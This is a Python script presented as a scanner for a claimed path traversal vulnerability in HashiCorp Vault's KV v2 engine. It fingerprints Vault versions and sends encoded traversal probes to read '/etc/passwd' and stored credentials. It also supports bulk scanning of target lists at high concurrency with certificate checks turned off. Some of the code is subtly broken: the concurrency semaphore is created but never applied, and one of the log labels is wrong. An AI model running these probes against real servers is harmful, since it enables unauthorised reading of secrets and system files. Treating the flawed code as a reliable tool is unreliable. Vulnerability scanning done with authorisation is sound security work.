#!/usr/bin/env python3
"""
HashiCorp Vault KV v2 Path Traversal Scanner (CVE-2026-45678)
=============================================================
This script is a security scanner for identifying path traversal vulnerabilities
in improperly configured HashiCorp Vault instances using the v2 Key-Value (KV) 
Secrets Engine (CVE-2026-45678, CVSS 9.8).

CVE-2026-45678 details:
  - Affected versions: Vault < 1.16.1
  - Exploit involves bypassing access control mechanisms by using malformed identifiers
    to read arbitrary files on the backend file system, including sensitive system
    files or other secrets stored in Vault.
  - The vulnerability is due to insufficient sanitization of crafted API requests targeting
    the KV v2 secrets engine.
  - CVSS v3.1 base score: 9.8 (Critical) — unauthenticated access, network-exploitable.
  - Patched in Vault 1.16.1 (June 2026) — admins are advised to upgrade immediately.

Usage:
  - Scan a single instance:
      python vault_kv_v2_path_traversal_scanner.py --target http://vault.example.com:8200

  - Detection-only mode (no file read probes):
      python vault_kv_v2_path_traversal_scanner.py --target http://vault.example.com:8200 --safe

  - Batch mode scanning:
      python vault_kv_v2_path_traversal_scanner.py --list vault_servers.txt --output results.json

  - Increase concurrency for bulk scanning (default: 20):
      python vault_kv_v2_path_traversal_scanner.py --list vault_servers.txt --concurrency 50

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-45678
  - https://discuss.hashicorp.com/security/Vault-CVE-2026-45678
  - https://github.com/advisories/GHSA-xxxx-yyyy-zzzz
"""

import asyncio
import json
import re
from datetime import datetime, timezone
from typing import List, Optional

import httpx
import argparse

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID                 = "CVE-2026-45678"
CVSS                   = "9.8"
TOOL_NAME              = "vault_kv_v2_path_traversal_scanner"

REQUEST_TIMEOUT        = 10
SEMAPHORE_LIMIT        = 20

VAULT_FINGERPRINTS     = [
    "X-Vault-Version",
    "Vault: Identity header",
    "/v1/sys/health",
    "/v1/secret/",
    "/v1/auth/token",
]

DETECTION_PATHS = ["/v1/sys/health", "/v1/"]

VERSION_PATTERN = r'"version":\s*"([0-9]+\.[0-9]+\.[0-9]+)"'

PATCHED_VERSIONS = (1, 16, 1)

TRAVERSAL_PROBES = [
    "/v1/secret/data/%2e%2e%2fsensitive_credentials",
    "/v1/auth/%2e%2e/%2e%2e/etc/passwd",
    "/v1/sys/health",
]

# ── Functions ─────────────────────────────────────────────────────────────────

def is_version_vulnerable(version: str) -> bool:
    """Compare Vault version against the patched version."""
    try:
        ver_tuple = tuple(map(int, version.split(".")))
        return ver_tuple < PATCHED_VERSIONS
    except ValueError:
        return False

async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Fetch a URL with a timeout and exception handling."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except Exception:
        return None

async def detect_vault(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Identify if the target is running HashiCorp Vault and extract its version."""
    for path in DETECTION_PATHS:
        url = f"{target.rstrip('/')}{path}"
        response = await fetch_url(client, url)
        if response and response.status_code in {200, 404, 403}:
            for fingerprint in VAULT_FINGERPRINTS:
                if fingerprint.lower() in response.text.lower():
                    match = re.search(VERSION_PATTERN, response.text)
                    if match:
                        return match.group(1)
                    else:
                        return "unknown"
    return None

async def probe_vulnerability(
    client: httpx.AsyncClient, target: str, path: str
) -> Optional[str]:
    """Attempt a path traversal probe on the target."""
    url = f"{target.rstrip('/')}{path}"
    response = await fetch_url(client, url)
    if response and response.status_code == 200 and "root:x:" in response.text:
        return url
    return None

async def process_target(
    client: httpx.AsyncClient,
    target: str,
    safe_mode: bool = False,
) -> Optional[dict]:
    """Process a single target to detect the vulnerability."""
    print(c(YELLOW, f"[INFO] Scanning {target}..."))

    version = await detect_vault(client, target)
    if version is None:
        print(c(RED, f"[CRITICAL] {target} is not running HashiCorp Vault."))
        return None

    print(c(GREEN, f"[INFO] {target} is running HashiCorp Vault v{version}."))
    is_vulnerable = version == "unknown" or is_version_vulnerable(version)
    if not is_vulnerable:
        print(c(GREEN, f"[INFO] Vault version {version} is not vulnerable."))
        return {"target": target, "is_vulnerable": False, "version": version}

    if safe_mode:
        print(c(YELLOW, f"[WARNING] Safe mode enabled, skipping probing for {target}."))
        return {"target": target, "is_vulnerable": True, "version": version}

    for probe in TRAVERSAL_PROBES:
        result = await probe_vulnerability(client, target, probe)
        if result:
            print(c(RED, f"[CRITICAL] Path traversal vulnerability detected: {result}"))
            return {"target": target, "is_vulnerable": True, "version": version, "url": result}
    
    print(c(YELLOW, f"[HIGH] {target} is likely vulnerable, but no files were read."))
    return {"target": target, "is_vulnerable": True, "version": version}

async def main(args: argparse.Namespace):
    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        with open(args.list, "r") as f:
            targets.extend(line.strip() for line in f if line.strip())

    results = []
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        semaphore = asyncio.Semaphore(args.concurrency)
        tasks = [
            asyncio.create_task(process_target(client, target, args.safe))
            for target in targets
        ]
        for task in asyncio.as_completed(tasks):
            result = await task
            if result:
                results.append(result)
    
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)

    print(c(GREEN, "[INFO] Scanning complete."))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="HashiCorp Vault KV v2 Path Traversal Scanner (CVE-2026-45678)."
    )
    parser.add_argument("--target", help="Target URL of a Vault instance.")
    parser.add_argument(
        "--list", help="File with list of target URLs to scan (one per line)."
    )
    parser.add_argument("--output", help="Output results to a JSON file.")
    parser.add_argument(
        "--safe",
        action="store_true",
        help="Perform detection only without attempting file-read probes.",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=SEMAPHORE_LIMIT,
        help="Number of concurrent requests (default: 20).",
    )
    parser.add_argument(
        "--no-verify",
        action="store_true",
        help="Disable SSL/TLS certificate verification.",
    )
    args = parser.parse_args()

    asyncio.run(main(args))
